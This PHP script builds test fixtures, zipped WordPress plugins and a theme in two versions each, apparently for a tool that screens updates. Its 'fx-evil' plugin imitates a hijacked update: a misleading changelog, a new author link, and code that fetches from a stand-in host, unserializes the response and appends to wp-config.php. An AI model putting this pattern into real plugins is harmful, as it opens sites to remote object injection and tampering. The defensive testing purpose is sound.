<?php
// Builds fixture plugins and a theme (two versions each) as zips plus the installed v1 folders.
// Usage: php fixtures.php <out-dir>      (test code only; never shipped)
$out = rtrim( $argv[1], '/' );
@mkdir( $out . '/zips', 0777, true );
@mkdir( $out . '/v1', 0777, true );

function put( $dir, $rel, $text ) {
	$path = $dir . '/' . $rel;
	@mkdir( dirname( $path ), 0777, true );
	file_put_contents( $path, $text );
}

function zipdir( $src, $zip, $top ) {
	$z = new ZipArchive();
	$z->open( $zip, ZipArchive::CREATE | ZipArchive::OVERWRITE );
	$it = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $src, FilesystemIterator::SKIP_DOTS ) );
	foreach ( $it as $f ) {
		$z->addFile( $f->getPathname(), $top . '/' . substr( $f->getPathname(), strlen( $src ) + 1 ) );
	}
	$z->close();
}

function plugin_main( $slug, $name, $version, $body = '', $extra_header = '' ) {
	return "<?php\n/**\n * Plugin Name: $name\n * Version: $version\n * Author: Fixture Author\n * Author URI: https://fixture-author.test/\n$extra_header * Text Domain: $slug\n */\nif ( ! defined( 'ABSPATH' ) ) { exit; }\n$body\n";
}

function readme( $version, $log ) {
	return "=== Fixture ===\nContributors: fixtureauthor\nStable tag: $version\n\n== Changelog ==\n\n= $version =\n* $log\n";
}

$defs = array();

// Benign: a small, ordinary change.
$defs['fx-benign'] = array(
	'1.0.0' => array( 'fx-benign.php' => plugin_main( 'fx-benign', 'FX Benign', '1.0.0', "add_action( 'wp_footer', function () { echo '<!-- fx-benign 1 -->'; } );" ), 'readme.txt' => readme( '1.0.0', 'First release.' ) ),
	'1.1.0' => array( 'fx-benign.php' => plugin_main( 'fx-benign', 'FX Benign', '1.1.0', "add_action( 'wp_footer', function () { echo '<!-- fx-benign 1.1 -->'; } );\nfunction fx_benign_title( \$t ) { return trim( \$t ); }" ), 'readme.txt' => readme( '1.1.0', 'Fix whitespace in titles.' ) ),
);

// Fatal: the new version breaks every front-end page.
$defs['fx-fatal'] = array(
	'1.0.0' => array( 'fx-fatal.php' => plugin_main( 'fx-fatal', 'FX Fatal', '1.0.0', "add_action( 'wp_footer', function () { echo '<!-- fx-fatal 1 -->'; } );" ), 'readme.txt' => readme( '1.0.0', 'First release.' ) ),
	'1.1.0' => array( 'fx-fatal.php' => plugin_main( 'fx-fatal', 'FX Fatal', '1.1.0', "add_action( 'template_redirect', function () { fx_fatal_missing_function(); } );" ), 'readme.txt' => readme( '1.1.0', 'Improvements.' ) ),
);

// Evil: compatibility-only changelog, large added code, remote unserialize, wp-config write, new author link.
$evil_lines = '';
for ( $i = 0; $i < 170; $i++ ) {
	$evil_lines .= "\$fx_evil_data[] = 'padding line $i to make the change large';\n";
}
$evil_body = "add_action( 'wp_footer', function () { echo '<!-- fx-evil 2 -->'; } );\n"
	. "function fx_evil_sync() {\n"
	. "\t\$r = wp_remote_get( 'https://analytics.fixture-cdn.test/payload' );\n"
	. "\t\$d = unserialize( wp_remote_retrieve_body( \$r ) );\n"
	. "\tfile_put_contents( ABSPATH . 'wp-config.php', '<?php // changed', FILE_APPEND );\n"
	. "\treturn \$d;\n}\n\$fx_evil_data = array();\n" . $evil_lines;
$defs['fx-evil'] = array(
	'1.0.0' => array( 'fx-evil.php' => plugin_main( 'fx-evil', 'FX Evil', '1.0.0', "add_action( 'wp_footer', function () { echo '<!-- fx-evil 1 -->'; } );" ), 'readme.txt' => readme( '1.0.0', 'First release.' ) ),
	'1.0.1' => array(
		'fx-evil.php' => str_replace( 'Author URI: https://fixture-author.test/', 'Author URI: https://other-owner.test/', plugin_main( 'fx-evil', 'FX Evil', '1.0.1', $evil_body ) ),
		'readme.txt'  => readme( '1.0.1', 'Check compatibility with WordPress version 6.8.2' ),
	),
);

// Assets: the new version points at a script that does not exist (warn only).
$defs['fx-assets'] = array(
	'1.0.0' => array( 'fx-assets.php' => plugin_main( 'fx-assets', 'FX Assets', '1.0.0', "add_action( 'wp_enqueue_scripts', function () { wp_enqueue_script( 'fx-assets', plugins_url( 'a.js', __FILE__ ), array(), '1', true ); } );" ), 'a.js' => "/* ok */\n", 'readme.txt' => readme( '1.0.0', 'First release.' ) ),
	'1.1.0' => array( 'fx-assets.php' => plugin_main( 'fx-assets', 'FX Assets', '1.1.0', "add_action( 'wp_enqueue_scripts', function () { wp_enqueue_script( 'fx-assets', plugins_url( 'gone.js', __FILE__ ), array(), '1', true ); } );" ), 'a.js' => "/* ok */\n", 'readme.txt' => readme( '1.1.0', 'Rename the script.' ) ),
);

foreach ( $defs as $slug => $versions ) {
	foreach ( $versions as $ver => $files ) {
		$tmp = sys_get_temp_dir() . '/updlock-fx-' . $slug . '-' . $ver;
		exec( 'rm -rf ' . escapeshellarg( $tmp ) );
		foreach ( $files as $rel => $text ) {
			put( $tmp, $rel, $text );
		}
		zipdir( $tmp, $out . '/zips/' . $slug . '-' . $ver . '.zip', $slug );
		if ( array_key_first( $versions ) === $ver ) {
			exec( 'rm -rf ' . escapeshellarg( $out . '/v1/' . $slug ) . ' && cp -r ' . escapeshellarg( $tmp ) . ' ' . escapeshellarg( $out . '/v1/' . $slug ) );
		}
	}
}

// Theme.
foreach ( array( '1.0.0', '1.1.0' ) as $ver ) {
	$tmp = sys_get_temp_dir() . '/updlock-fx-theme-' . $ver;
	exec( 'rm -rf ' . escapeshellarg( $tmp ) );
	put( $tmp, 'style.css', "/*\nTheme Name: FX Theme\nVersion: $ver\nAuthor: Fixture Author\nAuthor URI: https://fixture-author.test/\n*/\n" );
	put( $tmp, 'index.php', "<?php\nif ( ! defined( 'ABSPATH' ) ) { exit; }\n?><!doctype html><html><head><title>FX</title><?php wp_head(); ?></head><body><h1>FX Theme $ver</h1><?php wp_footer(); ?></body></html>\n" );
	zipdir( $tmp, $out . '/zips/fx-theme-' . $ver . '.zip', 'fx-theme' );
	if ( '1.0.0' === $ver ) {
		exec( 'rm -rf ' . escapeshellarg( $out . '/v1/fx-theme' ) . ' && cp -r ' . escapeshellarg( $tmp ) . ' ' . escapeshellarg( $out . '/v1/fx-theme' ) );
	}
}
echo "fixtures ok\n";
